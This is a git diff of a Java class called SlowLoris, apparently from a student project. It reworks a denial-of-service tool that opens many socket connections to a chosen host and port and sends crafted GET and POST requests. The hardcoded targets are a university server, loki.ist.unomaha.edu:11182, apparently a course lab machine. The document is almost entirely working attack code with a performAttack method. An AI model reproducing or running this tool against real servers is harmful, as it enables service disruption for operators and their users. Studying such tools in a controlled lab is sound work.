@@ -6,8 +6,8 @@ import java.net.Socket;
 import java.util.regex.Pattern;
 
 public class SlowLoris {
-    private String ipAddr;
-    private byte[] ipBytes;
+    private String netAddr;
+    private int port;
     private int numConnections;
 
     public static final int DEFAULT_CONNECTIONS = 10;
@@ -18,71 +18,153 @@ public class SlowLoris {
     private PrintWriter out;
 
     public SlowLoris() {
-        ipAddr = "";
+        netAddr = "";
+        port = 80;
         setNumConnections(DEFAULT_CONNECTIONS);
     }
 
     public SlowLoris(int nc) {
-        ipAddr = "";
+        this();
         if(!setNumConnections(nc)) {
             numConnections = 1;
         }
     }
 
-    public SlowLoris(int nc, String ip) {
-        if(!setNumConnections(nc)) {
-            numConnections = 1;
-        }
-        if(!setIPAddr(ip)) {
-            ipAddr = "";
-        }
+    public SlowLoris(int nc, String addr) {
+        this(nc);
+        setNetAddr(addr);
+    }
+
+    public SlowLoris(int nc, String addr, int port) {
+        this(nc, addr);
+        setPort(port);
     }
 
     public void performAttack() {
         String[] responses = new String[numConnections];
-        if(ipBytes != null) {
-            for(int i = 0; i < numConnections; i++) {
-                try {
-                    InetAddress ia = InetAddress.getByAddress(ipBytes);
-                    System.out.println("Attempting connection to " + ia.getHostAddress());
-                    sock = new Socket(ia, 80);
-                    in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
-                    out = new PrintWriter(sock.getOutputStream(), true);
-                } catch(Exception e) {
-                    System.out.println(e);
-                    e.printStackTrace();
-                }
-                if(sock == null) {
-                    break;
-                }
-                System.out.println("Successful connection.\n");
-                try {
-                    out.write("GET / HTTP/1.1\n");
-                    out.write("User-Agent: no good\n");
-                    out.write("Host: goaway.com\n");
-                    out.write("Accept-Language: en\n");
-                    out.write("\n");
-                    String response = in.readLine();
-                    responses[i] = response;
-                } catch(Exception e) {
-                    responses[i] = e.toString();
-                }
+        int requestCount = 0;
+        InetAddress ia;
+        try {
+            ia = InetAddress.getByName(netAddr);
+        } catch(Exception e) {
+            e.printStackTrace();
+            return;
+        }
+        for(int i = 0; i < numConnections; i++) {
+            try {
+                System.out.println("Attempting connection to " + ia.getHostAddress());
+                sock = new Socket(ia, getPort());
+                out = new PrintWriter(sock.getOutputStream());
+                in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
+            } catch (Exception e) {
+                System.out.println(e);
+                e.printStackTrace();
+            }
+            if (sock == null) {
+                break;
+            }
+            System.out.println("Successful connection #" + requestCount + "\n");
+            try {
+                out.println(generatePostAttackString());
+                out.flush();
+                //String response = in.readLine();
+                //responses[i] = response;
+                //System.out.println(response);
+                requestCount++;
+            } catch (Exception e) {
+                responses[i] = e.toString();
             }
         }
+        for(String s : responses) {
+            if(s != null && !s.equals("null")) {
+                System.out.println(s);
+            }
+        }
+        close();
+    }
+
+    public String pingTarget() {
+        String response = "";
+        try {
+            InetAddress ia = InetAddress.getByName(netAddr);
+            System.out.println("Attempting connection to " + ia.getHostAddress());
+            sock = new Socket(ia, getPort());
+            out = new PrintWriter(sock.getOutputStream());
+            in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
+        } catch(Exception e) {
+            System.out.println(e);
+            e.printStackTrace();
+            response = "Error during socket creation.";
+            return response;
+        }
+        if(sock == null) {
+            System.out.println("Null socket.");
+            response = "Error during socket creation.";
+            return response;
+        }
+        System.out.println("Successful connection.\n");
+        try {
+            out.println(generateAttackString());
+            out.flush();
+            String r = in.readLine();
+            response += r + "\n";
+            while( r != null) {
+                r = in.readLine();
+                response += r + "\n";
+            }
+        } catch(Exception e) {
+            response = "Error writing to socket: " + e.toString();
+        } finally {
+            close();
+        }
+        System.out.println(response);
+        return response;
     }
 
     public int getNumConnections() {
         return numConnections;
     }
 
-    public String getIPAddr() {
-        return ipAddr;
+    public String getNetAddr() {
+        return netAddr;
     }
 
-    public byte[] getIPBytes() {
-        return ipBytes != null ? ipBytes : new byte[4];
+    private String generateAttackString() {
+        String s;
+        s = "GET / HTTP/1.1\n";
+        s += "Host: loki.ist.unomaha.edu:11182\n";
+        s += "Connection: keep-alive\n";
+        s += "Pragma: no-cache\n";
+        s += "Cache-Control: no-cache\n";
+        s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
+        s += "Upgrade-Insecure-Requests: 1\n";
+        s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
+        s += "Accept-Encoding: gzip, deflate, sdch\n";
+        s += "Accept-Language: en-US,en;q=0.8\n";
+        s += "\n";
+        return s;
     }
 
+    private String generatePostAttackString() {
+        String s;
+        s = "POST /classes/index.cgi/search HTTP/1.1\n";
+        s += "Host: loki.ist.unomaha.edu:11182\n";
+        s += "Connection: keep-alive\n";
+        s += "Content-Length: 21\n";
+        s += "Origin: http://loki.ist.unomaha.edu:11182\n";
+        s += "Pragma: no-cache\n";
+        s += "Cache-Control: no-cache\n";
+        s += "Content-Type: application/x-www-form-urlencoded\n";
+        s += "Referer: http://loki.ist.unomaha.edu:11182/classes/\n";
+        s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
+        s += "Upgrade-Insecure-Requests: 1\n";
+        s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
+        s += "Accept-Encoding: gzip, deflate, sdch\n";
+        s += "Accept-Language: en-US,en;q=0.8\n";
+        s += "Message-Body: dpt=csci&sb=Search%21\n";
+        s += "\n";
+        return s;
+    }
     public boolean setNumConnections(int nc) {
         if(nc > 0) {
             numConnections = nc;
@@ -92,29 +174,41 @@ public class SlowLoris {
         }
     }
 
-    public boolean setIPAddr(String ip) {
-        if(ip == null || ip.isEmpty()) {
-            return false;
-        }
-        String[] ipSplit = ip.split(Pattern.quote("."));
-        for(String s : ipSplit) {
-            System.out.println(s);
-        }
-        if(ipSplit.length == 4) {
-            byte[] ipBytesTemp = new byte[4];
-            try {
-                for(int i = 0; i < 4; i++) {
-                    ipBytesTemp[i] = Byte.parseByte(ipSplit[i]);
-                }
-                ipBytes = ipBytesTemp;
-                ipAddr = ip;
-                return true;
-            } catch(Exception e) {
-                e.printStackTrace();
-                return false;
-            }
+    public void setNetAddr(String addr) {
+        if(addr != null && !addr.isEmpty()) {
+            this.netAddr = addr;
         } else {
-            return false;
+            this.netAddr = "";
+        }
+    }
+
+    public void setPort(int port) {
+        if(port > 1 && port < 65565) {
+            this.port = port;
+        } else {
+            this.port = 80;
+        }
+    }
+
+    public int getPort() {
+        return this.port;
+    }
+
+    public void close() {
+        try {
+            sock.close();
+        } catch(Exception e) {
+            System.out.println("close sock: " + e);
+        }
+        try {
+            in.close();
+        } catch(Exception e) {
+            System.out.println("close in: " + e);
+        }
+        try {
+            out.close();
+        } catch(Exception e) {
+            System.out.println("close out: " + e);
         }
     }
 }
